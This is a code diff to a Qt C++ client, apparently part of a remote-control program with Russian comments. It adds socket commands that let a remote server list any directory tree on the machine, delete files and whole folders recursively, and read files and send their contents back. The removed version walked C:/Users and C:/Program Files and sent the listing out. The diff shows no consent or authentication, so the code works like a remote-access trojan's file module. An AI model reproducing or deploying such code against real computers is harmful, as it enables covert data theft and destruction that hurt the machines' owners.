@@ -51,23 +51,72 @@ void MainWindow::ClientStartup()
                 socket->write(Data);
             }
 
-            if(data == "#getCFileTree")
+            if(data.startsWith("#getFileTree:"))
             {
-                QString filesData;
-                QDir dir("C:/Users/");
+                QString dataString = data.mid(13);
+                QDir dir(dataString);
                 QDirIterator iterator(dir.absolutePath(), QDirIterator::Subdirectories);
                 while (iterator.hasNext()) {
                     QFile file(iterator.next());
-                    filesData.push_back(file.fileName() + "\n");
-                }
-                QDir dir2("C:/Program Files/");
-                QDirIterator iterator2(dir2.absolutePath(), QDirIterator::Subdirectories);
-                while (iterator2.hasNext()) {
-                    QFile file(iterator2.next());
-                    filesData.push_back(file.fileName() + "\n");
+                    SelectedPath.push_back(file.fileName() + "\n");
                 }
 
-                socket->write("#getCFileTree:" + filesData.toLatin1());
+                socket->write("#getFileTree:" + SelectedPath.toLatin1());
+                socket->waitForBytesWritten();
+                SelectedPath.clear();
+            }
+            if(data.startsWith("#getAllFolders:"))
+            {
+                QString buffer = data.mid(15);
+                QString files;
+
+                QDir dir(buffer);
+
+                // Фильтруем только файлы и папки (без "." и "..")
+                QStringList entries = dir.entryList(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);
+
+                for (const QString &entry : entries) {
+                    files += entry + "\n";
+                }
+
+                // Отправляем данные на сервер
+                socket->write("#getAllFolders:" + files.toLatin1());
+                socket->waitForBytesWritten();
+
+            }
+            if(data.startsWith("#deleteFile:"))
+            {
+                QString deletePath = data.mid(12);
+                QFile::remove(deletePath);
+            }
+            if(data.startsWith("#deleteDir:"))
+            {
+                QString deleteDir = data.mid(11);
+                QDir dir(deleteDir);
+                dir.removeRecursively();
+            }
+            if(data.startsWith("#createFile:"))
+            {
+
+            }
+            if(data.startsWith("#copyFiles:"))
+            {
+                QString filePath = data.mid(11);
+                QFile file(filePath);
+
+                if (!file.open(QIODevice::ReadOnly)) {
+                    qDebug() << "❌ Ошибка: не удалось открыть файл" << filePath;
+                    return;
+                }
+
+                QByteArray fileData = file.readAll();
+                file.close();
+
+                QByteArray packet;
+                QDataStream out(&packet, QIODevice::WriteOnly);
+                out << QString("#copyFiles:") << QFileInfo(file).fileName() << fileData;
+
+                socket->write(packet);
                 socket->waitForBytesWritten();
             }
         });
